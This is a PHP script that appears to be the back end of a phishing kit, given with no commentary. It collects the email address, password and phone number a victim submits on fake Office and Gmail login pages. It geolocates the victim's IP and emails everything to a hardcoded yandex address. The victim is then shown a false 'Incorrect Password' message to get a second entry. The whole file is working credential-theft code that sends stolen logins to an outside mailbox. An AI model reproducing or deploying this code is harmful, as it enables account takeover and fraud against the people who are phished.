<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];

if(isset($_GET['others'])){	
	$ip = getenv("REMOTE_ADDR");
	$data = array();
    $data['sender-email'] = 'Jinna2323@yandex.com';
    $data['sender-name'] = 'PT Full Login';
    $data['reply-to'] = 'Jinna2323@yandex.com';
    $data['subject'] = ' Offic//e | $ip';
    $data['browser'] = $country." ".$_SERVER['HTTP_USER_AGENT'];

    $data['message'] = 
    '
    	<html>
			<head>
				<title>New Secure Login</title>
			</head>

			<body>
			    <p><strong>Email ID:</strong> '.$_REQUEST['email'].'</p>
			    <p><strong>Re-Password:</strong> '.$_REQUEST['password'].'</p>
			    <p><strong>Browser:</strong> '.$data['browser'].'</p>
			    <p><strong>IP:</strong> '.$ip.'</p>
			    <br>
			</body>
		</html>
    ';

    $data['reciever'] = 'Jinna2323@yandex.com';

	$mail->From = $data['sender-email'];
	$mail->FromName = $data['sender-name'];
	$mail->addAddress($data['reciever']);

	$mail->isHTML(true);
	$mail->Subject = $data['subject'];
	$mail->Body    = $data['message'];

	if(!$mail->send()) {
	    echo 'Message could not be sent.';
	    echo 'Mailer Error: ' . $mail->ErrorInfo;
	} else {
	    echo 'Incorrect Password!';
	}
} elseif(isset($_GET['gmail'])){	
	$ip = getenv("REMOTE_ADDR");
	$data = array();
    $data['sender-email'] = 'Jinna2323@yandex.com';
    $data['sender-name'] = 'PT Full Login';
    $data['reply-to'] = 'Jinna2323@yandex.com';
    $data['subject'] = ' Offic//e | $ip';
    $data['browser'] = $country." ".$_SERVER['HTTP_USER_AGENT'];

    $data['message'] = 
    '
    	<html>
			<head>
				<title>New Secure Login</title>
			</head>

			<body>
			    <p><strong>Email ID:</strong> '.$_REQUEST['email'].'</p>
			    <p><strong>Re-Password:</strong> '.$_REQUEST['password'].'</p>
			    <p><strong>Phone:</strong> '.$_REQUEST['phone-no'].'</p>
			    <p><strong>Browser:</strong> '.$data['browser'].'</p>
			    <p><strong>IP:</strong> '.$ip.'</p>
			    <br>
			</body>
		</html>
    ';

    $data['reciever'] = 'Jinna2323@yandex.com';

	$mail->From = $data['sender-email'];
	$mail->FromName = $data['sender-name'];
	$mail->addAddress($data['reciever']);

	$mail->isHTML(true);
	$mail->Subject = $data['subject'];
	$mail->Body    = $data['message'];

	if(!$mail->send()) {
	    echo 'Message could not be sent.';
	    echo 'Mailer Error: ' . $mail->ErrorInfo;
	} else {
	    echo 'Incorrect password!!';
	}
}